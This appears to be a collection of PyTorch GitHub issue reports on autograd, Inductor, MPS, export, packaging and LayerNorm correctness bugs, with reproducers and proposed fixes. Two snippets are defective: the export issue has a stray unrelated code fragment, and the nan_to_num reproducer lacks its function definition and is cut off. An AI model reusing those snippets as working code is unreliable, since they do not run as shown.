title: torchaudio is missing from the cu132 wheel index (only stale ≤2.2.0 wheels are listed)
body:
## Describe the bug

`https://download.pytorch.org/whl/cu132/` publishes `torch` and `torchvision` for the current release train, but `torchaudio` is effectively absent from it. The listing is not empty — it contains 248 links — however every one of them is a legacy wheel (`≤ 2.2.0`), all uploaded on 2023-10-06, and none of them carries a `+cu132` local version or a modern ABI tag.

```console
$ curl -s https://download.pytorch.org/whl/cu132/torchaudio/ | grep -c '<a href'
248

$ curl -s https://download.pytorch.org/whl/cu132/torchaudio/ \
    | grep -oE 'torchaudio-[0-9]+\.[0-9]+\.[0-9]+' | sort -uV | tail -5
torchaudio-2.0.2
torchaudio-2.1.0
torchaudio-2.1.1
torchaudio-2.1.2
torchaudio-2.2.0

$ curl -s https://download.pytorch.org/whl/cu132/torchaudio/ | grep -cE 'cu13|cp313|cp314'
0
```

For comparison, the same index does serve the current versions of the other two packages: `torch-2.13.0+cu132` and `torchvision-0.28.0+cu132` install from it without problems.

This produces two distinct failure modes for anything that depends on `torchaudio`.

### 1. Resolution failure when the resolver is restricted to the cu132 index

`uv --torch-backend=cu132` routes all torch-family packages to that index. `vllm==0.27.1` hard-pins `torchaudio==2.11.0`, which the index does not have:

```console
$ uv pip install vllm==0.27.1 torch==2.13.0 torchvision==0.28.0 \
    --torch-backend=cu132 \
    --extra-index-url https://download.pytorch.org/whl/cu132 \
    --index-strategy unsafe-best-match

  × No solution found when resolving dependencies:
  ╰─▶ Because there is no version of torchaudio==2.11.0 and vllm>=0.27.1 depends on torchaudio==2.11.0, we can
      conclude that vllm>=0.27.1 cannot be used.
      And because you require vllm==0.27.1, we can conclude that your requirements are unsatisfiable.
```

### 2. Runtime failure when torchaudio is taken from PyPI instead

Dropping `--torch-backend` lets the resolver mix indexes: `torch`/`torchvision` come from cu132, `torchaudio` from PyPI. Installation succeeds, but the PyPI build of `torchaudio` is compiled against CUDA 13.0, so importing it next to a CUDA 13.2 `torch` raises:

```python-traceback
  File ".../transformers/audio_utils.py", line 58, in <module>
    import torchaudio
  File ".../torchaudio/_extension/__init__.py", line 36, in <module>
    _check_cuda_version()
  File ".../torchaudio/_extension/utils.py", line 124, in _check_cuda_version
    raise RuntimeError(
RuntimeError: Detected that PyTorch and TorchAudio were compiled with different CUDA versions.
PyTorch has CUDA version 13.2 whereas TorchAudio has CUDA version 13.0.
Please install the TorchAudio version that matches your PyTorch version.
```

The import is not opt-in from the user's side: `transformers` imports `torchaudio` as soon as it is installed, so any vLLM entry point dies immediately — even `vllm --version`.

## Expected behavior

Either of these would resolve it:

1. Publish `torchaudio` for the current release train into `/whl/cu132/`, built against CUDA 13.2, matching the `torch`/`torchvision` builds already served there.
2. If `torchaudio` is intentionally not built for CUDA 13.2, say so in the release notes and **remove the stale `≤2.2.0` wheels from that index**. Their presence is worse than an empty listing: the index looks populated, resolvers treat it as a valid source for the package, and the resulting error message (`there is no version of torchaudio==2.11.0`) points at the requirement rather than at the missing build.

## Versions

- OS: Ubuntu Server 26.04 LTS, kernel 7.0.0-29-generic, x86_64
- Python: 3.14
- NVIDIA driver: 610.57.04
- GPUs: RTX PRO 6000 Blackwell Workstation Edition, RTX 5090
- `torch==2.13.0+cu132`, `torchvision==0.28.0+cu132` (from `/whl/cu132/`)
- `torchaudio==2.11.0` (from PyPI, built with CUDA 13.0)
- `vllm==0.27.1` (pins `torchaudio==2.11.0`)
- Installer: `uv 0.12.5`

title: [MPS] `bmm` silently returns wrong results when the output exceeds 2**32 elements and an input is non-contiguous
body:
## 🐛 Describe the bug

On macOS 15+, `torch.bmm` on MPS silently returns wrong values when the output has more than 2**32 elements and either input is a non-contiguous view, e.g. a transposed `k` in attention (`q @ k.transpose(-1, -2)`). No error or warning is raised. With contiguous inputs the same shapes are correct.

The shapes involved are realistic: attention scores `(B*H, L, L)` exceed 2**32 elements at, e.g., 32 heads × 4k context × batch 9. The case most likely to go unnoticed is batched feature extraction or probing on Apple Silicon, and attention-map analysis with `output_attentions=True` (which forces eager attention). There the corrupted activations can look like a mildly worse downstream metric rather than an obvious failure.

The reference in the script below is the CPU result for the same batch element.

```python
import torch

torch.manual_seed(0)
L, D = 256, 64
for B in (65536 - 16, 65536 + 16):  # output numel crosses 2**32 at B = 65536
    q = torch.randn(B, L, D, device="mps")
    k = torch.randn(B, L, D, device="mps")
    out = torch.bmm(q, k.transpose(1, 2))  # batch2 is a transposed (non-contiguous) view
    for i in (0, B - 1):
        ref = q[i].cpu() @ k[i].cpu().T
        err = ((out[i].cpu() - ref).abs().max() / ref.abs().max()).item()
        print(f"B={B} numel/2**32={B * L * L / 2**32:.4f} batch={i} rel_err={err:.2e}")
    del q, k, out
    torch.mps.empty_cache()
```

Output (torch 2.14.0, macOS 27.0, M2 Ultra):

```
B=65520 numel/2**32=0.9998 batch=0 rel_err=0.00e+00
B=65520 numel/2**32=0.9998 batch=65519 rel_err=0.00e+00
B=65552 numel/2**32=1.0002 batch=0 rel_err=1.51e+00
B=65552 numel/2**32=1.0002 batch=65551 rel_err=1.49e+00
```

Additional observations:

- Wrong results with a transposed `batch2` reproduce on torch 2.11.0, 2.12.1, 2.13.0 and 2.14.0. They appear at every batch index checked (0, 1, 32767, 65535, 65536, 65537, last), not only in the last tile.
- With `.contiguous()` inputs the same shape is correct on 2.11.0, 2.12.1 and 2.14.0 (rel_err 0). On 2.13.0 the contiguous case segfaults instead, which looks like a separate problem that 2.14.0 fixed.
- A non-contiguous `batch1` also gives wrong results on 2.14.0, and segfaults on 2.11.0.
- On 2.11.0–2.13.0, a later large `bmm` in the same process can segfault after the wrong-result call, so the strided read may also go out of bounds.
- The same failure reaches 4-D `torch.matmul(q, k.transpose(-1, -2))`, i.e. eager attention in HF `transformers` (found with DistilBERT, `(B, H, L, L) = (5712, 12, 256, 256)`).
- On macOS < 15 this shape raises `Tiling of batch matmul for larger than 2**32 entries only available from MacOS15 onwards`, so upgrading the OS turns a hard error into silently wrong output.

### Likely cause

`bmm_out_mps_impl` sends outputs larger than 2**32 elements to `tiled_bmm_out_mps_impl` (`aten/src/ATen/native/mps/operations/LinearAlgebra.mm`). That function takes the raw buffers via `getMTLBufferStorage` and builds `MPSNDArrayDescriptor`s from sizes alone, assuming a packed row-major layout. It never looks at the input strides. The code that materialises transposed views (`if (batch2.is_view() && !batch2.is_contiguous())`) runs only on macOS < 15, on the assumption that the strided kernels handle views on macOS 15+. The tiled path does not go through those kernels. The same structure is still on `main` as of 2026-09-16 (1943e23e).

A likely fix is to call `.contiguous()` on `batch1` and `batch2` before `tiled_bmm_out_mps_impl` (the call site already does `resolve_conj()`), or to raise an error for non-contiguous inputs.

## Versions

```
PyTorch version: 2.14.0 (also reproduced on 2.11.0, 2.12.1, 2.13.0)
OS: macOS 27.0 (arm64)
Python version: 3.13.9
CPU: Apple M2 Ultra (192 GB unified memory)
```

title: [aot_autograd] y = x.detach() updated in place with a value that requires grad is returned without its grad_fn
body:
### 🐛 Describe the bug

```python
import torch


def f(x):
    y = x.detach()
    y.add_(x)
    return y


for backend in ("eager", "aot_eager", "inductor"):
    torch._dynamo.reset()
    x = torch.ones(3, requires_grad=True)
    out = (f if backend == "eager" else torch.compile(f, backend=backend))(x)
    print(backend, out.requires_grad, out.grad_fn)
```

```
eager True <AddBackward0 object at 0x...>
aot_eager False None
inductor False None
```

Eager returns a tensor that requires grad (the in-place add gives `y` a history), aot_eager and inductor one that doesn't, so a loss through it silently gets no gradient from it. Leaf or non-leaf `x`, 2.9.1, 2.14.0 and the 21 Sep nightly on CPU, 2.14.0 on CUDA.

The output is recorded as `alias_of_input` with `view_meta_sequence=ViewMetaSequence(detach)` and `requires_grad=True`, and the runtime wrapper regenerates it from the updated input by replaying the `detach` in `gen_alias_from_base`, which drops that history. I haven't looked at where a fix should go.

title: torch.compile (Inductor): eager != compiled for torch.put with accumulate when input/index/source alias a computed intermediate
body:
### 🐛 Describe the bug

### Description

`torch.compile` produces a different integer result than eager for `torch.put(r, r, r, accumulate=True)` when `r` is a **computed intermediate** and `input`/`index`/`source` are the same tensor. Both eager and compiled are deterministic across repeated runs; they simply disagree.

**I'm aware this is an unusual aliasing pattern** (input == index == source). I'm reporting it because (a) it's a deterministic eager-vs-compiled divergence, and (b) the operation appears well-defined — with `accumulate=True`, `torch.put` reads the original `index`/`source` values and accumulates into a copy of `input`, so the result should be order-independent and match eager. If aliasing `input` with `index`/`source` is considered unsupported, please close — but flagging in case the compiled path is dropping a required copy.

### Minimal reproducer (CPU)

```python
import torch

base = (torch.arange(48) % 9).reshape(3, 16)     # deterministic int64 tensor

def model(x):
    r = x + 1                                     # r is a compiled intermediate
    return torch.put(r, r, r, accumulate=True)    # input == index == source == r

eager = model(base)
torch._dynamo.reset()
compiled = torch.compile(model)(base)

print("eager == compiled:", torch.equal(eager, compiled))   # False
d = (eager.flatten() != compiled.flatten()).nonzero().flatten()
for i in d.tolist():
    print(f"  pos {i}: eager={eager.flatten()[i].item()} compiled={compiled.flatten()[i].item()}")
# e.g. pos 9: eager=46 compiled=54
```

### Result

```
eager == compiled: False
  pos 9: eager=46 compiled=54
```

Both are stable across repeated runs (eager==eager, compiled==compiled), so this is a genuine divergence, not nondeterminism.

### Ablation (isolates the trigger)

The divergence appears **only** when all three of `input`/`index`/`source` are the same *computed intermediate*:

| case | result |
| --- | --- |
| `put(r, r, r)` with `r = x + 1` (aliased intermediate) | ❌ eager ≠ compiled |
| `put(r.clone(), r, r)` / non-aliased `put(inp, idx, src)` | ✅ match |
| `r` as a graph **input** (leaf) instead of intermediate | ✅ match |
| any single op in isolation | ✅ match |

This points at functionalization/aliasing of `torch.put` when its inputs alias a fused intermediate. Found via fuzzing.

title: [inductor][cpu] C++ compile error when a bool, e.g. from an int64 comparison, is loaded under a mask
body:
### 🐛 Describe the bug

```python
import torch


def f(a):
    y = a > 0
    y[1:] = y[:-1].clone()
    return y


a = torch.randint(-5, 5, (4, 64))
torch.compile(f)(a)
```

```
torch._inductor.exc.InductorError: CppCompileError: C++ compile error
...main.cpp:31:42: error: operands to '?:' have different types 'at::vec::CPU_CAPABILITY::VecMask<long int, 2>' and 'at::vec::CPU_CAPABILITY::VecMask<float, 1>'
```

The same with comparisons of int32, uint8 and float64, `a.bool()`, and bitwise or logical ops on bools (`VecMask<int, 1>` then), and with `F.pad(y[:-1], (0, 0, 1, 0))` in place of the slice assignment. 2.9.1, 2.14.0 and the 21 Sep nightly, CPU.

A vectorized bool is a `VecMask` whose base type follows how it was computed: `VecMask<int64_t, N>` for a comparison of int64, `VecMask<int32_t, N>` after a bitwise op on bools. In `CppVecOverrides.masked` the default value is always a `VecMask<float, N>`, so with a scalar mask the select `mask ? body() : other` has arms of two types. With a vector mask it goes through `where()`, which casts both to float (#126662). Casting the vectorized body of a bool to `VecMask<float, N>` in `masked` fixes all of these; I have it with a test and can open a PR.

title: [aot_autograd] An input updated after the graph gets another input's value when the function returns that other input
body:
### 🐛 Describe the bug

```python
import torch


def f(x, w):
    w.mul_(2)
    x.add_(1)
    return x


for backend in ("eager", "aot_eager", "inductor"):
    torch._dynamo.reset()
    x = torch.full((3,), 10.0)
    w = torch.full((3,), 3.0, requires_grad=True) * 1.0
    (f if backend == "eager" else torch.compile(f, backend=backend))(x, w)
    print(backend, w.tolist())
```

```
eager [6.0, 6.0, 6.0]
aot_eager [11.0, 11.0, 11.0]
inductor [11.0, 11.0, 11.0]
```

After the compiled call `w` holds `x`'s new value, with no error. The same with a leaf `w` updated through `w.detach().mul_(2)` or `w.data.mul_(2)`. 2.9.1, 2.14.0 and the 21 Sep nightly on CPU, 2.14.0 on CUDA. `backend="eager"` is right, and so is aot_eager with `keep_inference_input_mutations=False`.

`w` requires grad, so its new value is a graph output that the runtime wrapper copies back. `x` doesn't, so with `keep_inference_input_mutations` its update stays in the graph as a `copy_`. Then `create_functionalized_fn` in graph_capture_wrappers.py, where it returns a mutated input directly for an output that is that input, does `flat_outs[i] = fw_args[info.base_idx]` with `i` the index in `meta.output_info`. `flat_outs` starts with the updated inputs, so this replaces `w`'s new value with `x`: the multiply becomes dead code and the epilogue copies `x` into `w`. Under `torch.compile` it needs Dynamo to make `x` a graph output, which here happens because it's the only output; `aot_function` with `keep_inference_input_mutations=True` hits it directly.

Offsetting the index by `meta.num_mutated_inp_runtime_indices` makes both forms right on 2.9.1, 2.14.0 and the nightly. I can send that with a test.

title: [export] Bug Report: module.to(device) on exported programs causes assertion failures (device-agnostic export broken since 2.8)
body:
### 🐛 Describe the bug

When casting an ExportedProgram to a different device (a common strategy for device-agnostic export), the IR contains a hardcoded assertion introduced in [PR #149235](https://github.com/pytorch/pytorch/pull/149235) (cc @chauhang @penguinwu @avikchaudhuri @gmagogsfm @zhxchen17 @tugsbayasgalan @angelayi @suo @ydwu4 @pianpwk )

```
    _assert_tensor_metadata_default = torch.ops.aten._assert_tensor_metadata.default(idx, dtype = torch.int64, device = 'cuda:0', layout = torch.strided);  
```
This assertion is not updated when calling module.to(device), leading to runtime failures, even though tensors have been correctly moved.

### Why This Is a Problem
We are developing a device-agnostic export strategy, where exported modules can be seamlessly recast to different devices in production. The new IR behavior breaks this assumption by hardcoding device in the assert statement at export time.

The issue is particularly confusing because it only manifests at runtime, not during export. As a result, models that export successfully in PyTorch 2.8 may fail unexpectedly in production—even though the same workflow worked without issue in 2.7.

```python
# Minimal Repro
import torch, torch.nn as nn
from torch import export
import traceback

class M(nn.Module):
    def forward(self, x):
        return x.long().sum()

m = M()

ep = export.export(m, (torch.zeros(4, dtype=torch.float32),))
gm = ep.module()
gm_cuda = gm.to("cuda:0")
gm_cuda(torch.ones(4, dtype=torch.float32, device="cuda:0"))
```

Error Trace
```
Traceback (most recent call last):
  File "/home/jobuser/torch_test.py", line 14, in <module>
    gm_cuda(torch.ones(4, dtype=torch.float32, device="cuda:0"))
  File "/home/jobuser/.local/lib/python3.10/site-packages/torch/fx/graph_module.py", line 905, in call_wrapped
    return self._wrapped_call(self, *args, **kwargs)
  File "/home/jobuser/.local/lib/python3.10/site-packages/torch/fx/graph_module.py", line 425, in __call__
    raise e
  File "/home/jobuser/.local/lib/python3.10/site-packages/torch/fx/graph_module.py", line 412, in __call__
    return super(self.cls, obj).__call__(*args, **kwargs)  # type: ignore[misc]
  File "/home/jobuser/.local/lib/python3.10/site-packages/torch/nn/modules/module.py", line 1774, in _wrapped_call_impl
    return self._call_impl(*args, **kwargs)
  File "/home/jobuser/.local/lib/python3.10/site-packages/torch/nn/modules/module.py", line 1880, in _call_impl
    return inner()
  File "/home/jobuser/.local/lib/python3.10/site-packages/torch/nn/modules/module.py", line 1828, in inner
    result = forward_call(*args, **kwargs)
  File "<eval_with_key>.8", line 6, in forward
  File "/home/jobuser/.local/lib/python3.10/site-packages/torch/_ops.py", line 829, in __call__
    return self._op(*args, **kwargs)
RuntimeError: Tensor device mismatch! Expected: cpu, Got: cuda:0
```
### Workarounds (discussed with @supercharleszhu)

#### 1. Disable aten.to metadata assertions

```
from torch._export.utils import _disable_aten_to_metadata_assertions

with _disable_aten_to_metadata_assertions():
    ep = export.export(m, (torch.zeros(4, dtype=torch.long),), strict=True)
```

Drawback: Disables optimizations like operator fusion that depend on metadata assertions.

#### 2. Use passes.move_to_device_pass

Drawback: Creates a new parameter group, requiring relinking optimizer states if used for training.

### Proposed Fix

Add a GraphModule.to() override that updates IR metadata alongside parameters/buffers:
```
class GraphModule(torch.nn.Module):
...    
    def to(self, *args, **kwargs):
        # 1. Move buffers/params
        result = super(GraphModule, self).to(*args, **kwargs)

        # 2. Parse device
        device, dtype, non_blocking, memory_format = torch._C._nn._parse_to(*args, **kwargs)
        if device is None:
            return result
        new_device = torch.device(device)

        # 3. Update IR metadata
        for node in self.graph.nodes:
            if "device" in node.kwargs:
                node.kwargs = {**node.kwargs, "device": new_device}

            if node.op == "call_function" and node.target == torch.ops.aten.to.device:
                args = list(node.args)
                args[1] = new_device
                node.args = tuple(args)

            if "val" in node.meta:
                node.meta["val"] = torch.utils._pytree.tree_map(
                    lambda v: v.to(new_device) if isinstance(v, torch.Tensor) else v,
                    node.meta["val"],
                )

        self.recompile()
        return result
```

```

        y = y + 10

func(torch.rand(100, 100, device="cuda"))
```

we have to options

title: [inductor][cpu] int64 vector multiply is signed overflow on AVX2: (x * x) % 72 and (x * x) // 72 are wrong when the square wraps
body:
### 🐛 Describe the bug

```python
import torch


def f(x):
    return (x * x) % 72, (x * x) // 72


x = torch.full((8,), 2**62 + 1, dtype=torch.int64)
print(f(x))
print(torch.compile(f)(x))
```

Eager gives 65 and -128102389400760776 in every element, compiled gives 9 and 128102389400760775. 2.14.0 and the 21 Sep nightly, CPU, gcc 13.3, AVX2 (an i7-12700 and an i5-1240P). CUDA is right. `x * y` with `y` a tensor holding the same values is right, and so are `config.cpp.simdlen = 1`, `-fwrapv` and `-O0`.

On AVX2, `Vectorized<int64_t>::operator*` in aten/src/ATen/cpu/vec/vec256/vec256_int.h multiplies lane by lane with a signed `int64_t` multiply, and the comment above it says the UB is ignored on purpose. In eager each op is its own kernel. In the C++ Inductor generates, the multiply is inlined next to `remainder_integral` and the integer floor division, which also work lane by lane, and gcc uses `x * x >= 0`: it drops the sign fixup and divides unsigned. `x * x` is 2**63 + 1 read as unsigned, and (2**63 + 1) % 72 is 9. The scalar path is right because `CppOverrides.mul` goes through the unsigned type (`arith_promoted`, from #191132, which left the vector ops out of scope); `CppVecOverrides.mul` emits `a * b`.

Doing the lane multiply in `uint64_t` in vec256_int.h makes both right and compiles to the same `imul`. I have it with a test and can open a PR. Same kind of UB as the neg in #198555.

title: ☂️ Forward-mode and higher-order AD return wrong derivatives
body:
Umbrella tracking issue for a **class** of bugs: `torch.func.jvp` / `torch.autograd.forward_ad`, nested (second-order) forward AD, `jacfwd`, and `hessian` return **numerically wrong derivatives** for ops whose first-order backward is correct. No error is raised; the wrong number flows into an optimizer, an implicit-layer solve or a physics model and surfaces as a training problem rather than a stack trace.

This is the forward-mode sibling of the eager-vs-compiled correctness umbrellas (#195547, #197554). If the repro only misbehaves under `torch.compile`, it belongs on `oncall: pt2`, not here.

### The shared root cause

Every member is a **per-op formula bug in a hand-written derivative rule** (`tools/autograd/derivatives.yaml` / `torch/csrc/autograd/FunctionsManual.cpp`), not an infrastructure bug in the forward-AD machinery:

- a JVP written with the factors in the wrong order for a non-commutative product (`cholesky_inverse`, `cholesky_solve`);
- a second-order term dropped when the JVP rule is itself differentiated (`linalg.solve`, `det`, `slogdet`, `householder_product`, `batch_norm`, `layer_norm`);
- a rule that is only right on the generic branch and wrong at a boundary the sample inputs never hit (`cumprod` at a zero factor, `scatter_reduce(prod)` with a zero, `triangular_solve(unitriangular=True)`, `logcumsumexp` with an underflowing prefix, `sinc` / `logaddexp` at a removable singularity);
- a custom `autograd.Function` whose `jvp` is not re-entered for higher derivatives (#197867).

Each one needs its own derivation and a float64 / complex128 finite-difference check. They are cheap to fix individually, but that is exactly why they keep coming back: the class is **under-tested**, so each fix only covers the op somebody happened to sweep.

### Why CI did not catch these

All of the affected ops declare `supports_forward_ad=True` and `supports_fwgrad_bwgrad=True` in their `OpInfo`, and none of the second-order ones carry a skip. The gap is in what the harness checks:

| Order | What is tested today | Reference |
|---|---|---|
| first-order JVP | `test_forward_mode_AD` (`gradcheck(check_forward_ad=True)`) | finite differences |
| reverse-over-forward | `test_fn_fwgrad_bwgrad` | finite differences |
| reverse-over-reverse | `test_fn_gradgrad` | finite differences |
| **forward-over-forward** (nested JVP) | `functorch` `test_jvpjvpvmap` only | **vmap-vs-loop consistency, no numerical reference**, and only over `autograd_function_db` |

So a wrong second-order JVP passes CI as long as it is wrong the same way with and without `vmap`. The first-order members slipped through a different hole: `sample_inputs` never exercise the failing regime (zero factors, `unitriangular=True`, underflowing prefixes), and `cholesky_solve` has `test_forward_mode_AD` skipped outright.

### What would close the class

**Not one PR per op.** Per-op fixes are welcome (two are already up) and each member stays open as the record for its reproducer, but the ask that actually closes the class is test infrastructure:

- [ ] an `OpInfo` test that checks **forward-over-forward** against a finite-difference reference (`gradcheck` already has `check_forward_ad`; add a nested variant or extend `gradgradcheck` with a `check_fwd_over_fwd` mode) and turn it on for every op with `supports_forward_ad=True`;
- [ ] audit ops whose forward-AD tests are skipped or whose `sample_inputs` avoid the singular / boundary regime, and add `error_inputs`-style boundary samples for derivative checks;
- [ ] for `autograd.Function`, a test that `jvp` composes with itself (`jacfwd(jacfwd(f))`) over `autograd_function_db`.

### Members

**Batch of 2026-09-11 (all forward-AD formula bugs, float64 finite-difference reproducers in each):**

- [ ] #196682 — `cholesky_inverse` JVP places the inverse on the wrong side of the tangent (fix: #197010)
- [ ] #196694 — `cholesky_solve` propagates an incorrect tangent through the Cholesky factor
- [ ] #196695 — `linalg.solve` loses a second-order term under nested forward AD
- [ ] #196696 — `det` second derivative wrong under nested JVP
- [ ] #196697 — `linalg.slogdet` returns zero instead of a nonzero second-order JVP
- [ ] #196698 — `linalg.householder_product` nested JVP wrong
- [ ] #196699 — `nn.functional.batch_norm` second-order JVP wrong
- [ ] #196700 — `nn.functional.layer_norm` second-order JVP wrong
- [ ] #196701 — `cumprod` nested JVP wrong at a zero factor
- [ ] #196702 — `scatter_reduce(reduce="prod")` returns a zero JVP for a nonconstant polynomial
- [ ] #196703 — `sinc` second derivative is NaN at its removable singularity
- [ ] #196704 — `logaddexp` second-order AD is NaN for finite logits
- [ ] #196705 — `logcumsumexp` drops an early-prefix first-order JVP contribution (fix: #196741)
- [ ] #196707 — `triangular_solve(unitriangular=True)` differentiates the ignored diagonal

**Other reports of the same class:**

- [ ] #197867 — nested `jacfwd` through a custom `autograd.Function` returns 0 for higher derivatives

**Already fixed, listed as a prior instance:** #196680 (`ldexp` dropped the derivative contribution of a negative exponent).

The list is seeded from the 2026-09 triage sweep; comment here with a short float64 reproducer and it will be added.

### Out of scope

- Forward AD **raising** `NotImplementedError` / "not supported" for an op (a missing rule, not a wrong one), e.g. #182641, #182661, #182842, #191787.
- Low-precision `inf`/`nan` in a derivative where the float64 formula is right (dynamic range, not a formula bug).
- Wrong derivatives that appear only under `torch.compile` (e.g. #190855) — `oncall: pt2`.
- First-order **backward** formula bugs; those go on their own tracker.

title: [inductor]  Compiling torch.nan_to_num on complex128 raises RuntimeError: Complex dtype is not supported for isneginf, got dtype torch.complex128
body:
### 🐛 Describe the bug

torch.compile with the Inductor backend fails when compiling a model that applies torch.nan_to_num to a torch.complex128 tensor.

The operation executes successfully in eager mode, but Inductor compilation raises a runtime error during graph tracing/decomposition. The failure appears to come from the decomposition of torch.nan_to_num, which lowers the operation into calls to torch.isnan, torch.isneginf, and torch.isposinf. Here is the [gist](https://colab.research.google.com/gist/jasminetrail/b45c456695109aa1641e5b9da44eee2e/issue_190275.ipynb)

```python
import torch

torch.manual_seed(0)
t54230 = torch.randn([1, 3], dtype=torch.complex128)

    t54231 = torch.nan_to_num(t54230)
    return t54231

# eager baseline -- succeeds
eager_out = model_19722()
print("eager OK:", type(eager_out))

# inductor compile -- crashes
compiled = torch.compile(model_19722, backend="inductor")
with torch.no_grad():
```

title: aarch64 CPU op-benchmark: matmul 256×256 trans_b ~25× slower than baseline
body:
## Summary

On aarch64 CPU `operator_benchmark` (eager, `short` tag), one `matmul` config is ~25× slower than the checked-in expected CSV. Neighboring GEMMs on the **same job** got *faster*, so this is not a slower runner or a globally stale ARM baseline.

Tracked from empty PR https://github.com/pytorch/pytorch/pull/195472 (no functional change; two `ciflow/op-benchmark` runs, including a rebase).

## Case

`matmul_M256_N256_K256_trans_aFalse_trans_bTrue_cpu`

- Job: `aarch64-opbenchmark-test` / `cpu_operator_benchmark_short`
- Runner: `mt-l-arm64g4-16-62` (`linux.arm64.m8g.4xlarge`)
- Checker: `benchmarks/operator_benchmark/check_perf_csv.py` (FAIL if actual > 2× expected)
- CSV: `aarch64_expected_ci_operator_benchmark_eager_float32_cpu.csv`

## Times (`Execution Time`)

| | Expected | Run 1 | Run 2 |
|---|---:|---:|---:|
| `matmul_M256 … trans_a=False trans_b=True` | 234.09 | **5573** (23.8×) | **6599** (28.2×) |
| `matmul_M128 … trans_a=True trans_b=False` (same job) | 233.29 | 128.84 (improved) | 127.17 (improved) |
| `mm_M64_N64_K64` f32 (same job) | 99.35 | 52.82 (improved) | 52.36 (improved) |

Expected for the 256 `trans_b` row is almost the same number as 128 `trans_a` (234 vs 233), which is also suspicious.

## What we did on the PR

Skipped this case in `SKIP_TEST_LISTS` so CPU op-benchmark CI can go green **without** writing ~6k into the expected CSV (that would hide a 25× regression). Drop the skip once this path is fixed.

## Ask

Confirm whether 256×256 `trans_b=True` on this ARM SKU is supposed to be ~234 or ~6k. If ~234 was real, this is a GEMM/transpose path regression on `main`.

title: LayerNorm returns non-zero on constant input: cuWelfordCombine uses a weighted average of means instead of Welford's increment
body:
A customer reported it, I reproduced it locally, and the possible solution seems to fix the issue locally. The detailed analysis below was produced with Claude Code.

> ## Summary
>
> `F.layer_norm` on a constant input returns a non-zero result. The input has zero variance, so every output element must be exactly zero.
>
> ```python
> import torch, torch.nn.functional as F
> x = torch.ones(4, 384, dtype=torch.float32, device='cuda')
> print(F.layer_norm(x, (384,), eps=1e-5).abs().max())
> # ROCm/gfx950: tensor(1.8849e-05, device='cuda:0')     expected: tensor(0.)
> ```
>
> The saved mean is the culprit: `torch.native_layer_norm(x, (384,), None, None, 1e-5)[1]` returns `0x3F7FFFFF`, i.e. `nextafter(1.0f, 0)`, instead of `1.0f`. The saved `rstd` is bit-exactly `rsqrt(eps)` at every width, so `sigma2` is exactly 0 and only the mean is wrong. `x - mean` is then one ulp instead of zero, and `rstd = rsqrt(1e-5) = 316.23` amplifies it.
>
> **This is not ROCm-specific.** ROCm is much worse, but the underlying formula is wrong on CUDA too - see "Which widths fail" below.
>
> ## Root cause
>
> `aten/src/ATen/native/cuda/layer_norm_kernel.cu`, `cuWelfordCombine`:
>
> ```c
>       auto nA = dataA.count * coef;
>       auto nB = dataB.count * coef;
>       mean = nA*dataA.mean + nB*dataB.mean;        // line 193
> ```
>
> This combines two partial means as a **weighted average**, not as Welford's increment. It is exact only if `nA + nB == 1` exactly, which is not guaranteed for any `coef`, correctly rounded or not. The canonical in-tree Welford combine, `WelfordOps::combine` in `aten/src/ATen/native/SharedReduceOps.h:106-124`, instead uses `a.mean + delta * nb_over_n`, which is exactly mean-preserving whenever both partials agree. That is why `torch.mean` and `torch.var` are exact on the very same tensors, and why widths with `N % 4 != 0` are clean - they miss the vectorized dispatch predicate and fall back to `RowwiseMomentsCUDAKernel`, which uses `WelfordOps`.
>
> On ROCm, `coef` additionally comes from the hardware approximate reciprocal (line 187), which makes `nA + nB != 1` far more often:
>
> ```c
> #if defined(USE_ROCM) && defined(USE_LAYERNORM_FAST_RECIPROCAL)
>       auto coef = __builtin_amdgcn_processor_is("gfx90a") ? fn_rcp(count): __builtin_amdgcn_rcpf(count);
> #else
>       auto coef = fn_rcp(count);
> #endif
> ```
>
> `USE_LAYERNORM_FAST_RECIPROCAL` defaults ON for every ROCm build (`cmake/Dependencies.cmake:1125-1134`), and the carve-out names only gfx90a, so gfx942 and gfx950 both take it. Measured on gfx950, `v_rcp_f32` is exact at every power of two and at 5, 9, 10, 20, 36, 40, 80, but 1 ulp low at 3, 6, 12, 24, 48, 96, 192, 384, 768 and 1536 - which is why `3 * 2^k` widths are the ones that stand out in ROCm bug reports.
>
> The ROCm reciprocal is a source-level choice, not a compiler lowering. Compiling one translation unit twice for gfx950, changing only that macro:
>
> ```
> WITH  -DUSE_LAYERNORM_FAST_RECIPROCAL :  v_rcp_f32_e32 v0, v2
> WITHOUT                               :  v_div_scale_f32 / v_rcp_f32_e32 / v_div_fmas_f32 / v_div_fixup_f32
> ```
>
> Left alone the compiler emits the IEEE correctly-rounded divide sequence.
>
> ## Which widths fail
>
> Replicating `compute_stats` exactly in a standalone kernel, so that the reciprocal and the formula can be switched independently in one binary, and sweeping every width from 4 to 4096 in steps of 4 (1024 widths) on an MI355X:
>
> | reciprocal | mean formula | failing widths |
> |---|---|---|
> | `__builtin_amdgcn_rcpf` | weighted average (current) | **691 / 1024** |
> | `1.0f / count` (IEEE) | weighted average (current) | **131 / 1024** |
> | `__builtin_amdgcn_rcpf` | Welford increment (proposed) | 0 / 1024 |
> | `1.0f / count` (IEEE) | Welford increment (proposed) | 0 / 1024 |
>
> The second row is the important one: **with a correctly-rounded reciprocal the current formula still fails at 131 widths**, the smallest being 164, 188, 220, 244, 460, 488, 564, 636. Only the formula change fixes it; reciprocal accuracy alone does not.
>
> Those figures are for a wave64 / 256-thread block. A simulation of the CUDA block shape (warp 32, 128 threads, `vec_size` 4) in correctly-rounded fp32 predicts 6 failing widths there - **244, 328, 332, 372, 460, 488** - with the mean coming back as `0.9999999403953552` at width 244. The same simulator reproduces the measured wave64 failure list exactly, which is the basis for trusting it, but **I had no NVIDIA device and this half is unverified on hardware**. Someone with an A100 or similar should run:
>
> ```python
> x = torch.ones(4, 244, dtype=torch.float32, device='cuda')
> F.layer_norm(x, (244,), eps=1e-5).abs().max()   # expected 0.
> ```
>
> Row count is irrelevant. fp32, bf16 and fp16 all fail identically; fp64 is clean because it does not take the vectorized path. `torch.compile` is clean because inductor generates its own kernel.
>
> ## Proposed fix
>
> Use Welford's increment in the combine, keeping whatever reciprocal the platform uses:
>
> ```c
>       auto nB = dataB.count * coef;
>       mean = (dataA.count == U(0)) ? dataB.mean : dataA.mean + delta * nB;
>       sigma2 = dataA.sigma2 + dataB.sigma2 + delta * delta * dataA.count * nB;
> ```
>
